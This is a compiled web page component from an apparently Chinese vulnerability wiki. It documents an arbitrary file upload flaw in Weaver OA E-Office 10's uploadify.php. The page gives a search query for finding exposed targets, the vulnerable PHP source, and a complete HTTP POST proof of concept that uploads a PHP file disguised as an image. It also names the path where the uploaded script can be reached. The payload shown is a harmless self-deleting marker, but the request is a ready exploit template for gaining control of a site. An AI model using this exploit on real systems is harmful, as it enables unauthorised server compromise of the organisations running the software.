import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const l={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>泛微OA E-Office 在 uploadify.php 中上传文件过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>泛微OA E-Office10</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;泛微-EOffice&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201344907.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
include_once(&quot;inc/vulnerability.php&quot;);
if (!empty($_FILES)) {
    $tempFile = $_FILES[&#39;Filedata&#39;][&#39;tmp_name&#39;];
    //获取扩展名
    if (!strrpos($tempFile, &quot;.&quot;)) {
        echo &quot;&quot;;
        exit;
    }
    $fileExt = substr($tempFile, strrpos($tempFile, &quot;.&quot;) + 1);
    $attachmentID = createFileDir();
    $uploadPath = $_REQUEST[&quot;uploadPath&quot;];

    if (trim($uploadPath) == &quot;&quot;) {
        $targetPath = $_SERVER[&#39;DOCUMENT_ROOT&#39;] . &#39;/attachment/&#39; . $attachmentID;
    } else {
        $targetPath = $uploadPath . &#39;/sent/attachment/&#39; . $attachmentID;
    }

    if (!file_exists($targetPath)) {
        mkdir($targetPath, 0777, true);
    }

    $targetFile = str_replace(&#39;//&#39;, &#39;/&#39;, $targetPath) . &quot;/&quot; . $_FILES[&#39;Filedata&#39;][&#39;name&#39;];
    isIllegalUploadFile($targetFile);
    move_uploaded_file($tempFile, iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $targetFile));
    echo $attachmentID;
}

function createFileDir() {
    global $ATTACH_PATH;
    mt_srand((double) microtime() * 1000000);
    $RADOM_ID = mt_rand() + mt_rand();
    if (!file_exists($ATTACH_PATH . $RADOM_ID))
        return $RADOM_ID;
    else
        createFileDir();
}

?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Connection: close
Content-Length: 259
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
Accept-Encoding: gzip

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;2TrZmO0y0SU34qUcUGHA8EXiDgN.php&quot;
Content-Type: image/jpeg

&lt;?php echo &quot;2TrZmO0y0SU34qUcUGHA8EXiDgN&quot;;unlink(__FILE__);?&gt;

--e64bdf16c554bbc109cecef6451c26a4--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150715083.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/attachment/3466744850/xxx.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,15),t=[d];function s(r,c){return i(),n("div",null,t)}const m=e(l,[["render",s],["__file","泛微OA E-Office uploadify 任意文件上传漏洞.html.vue"]]);export{m as default};
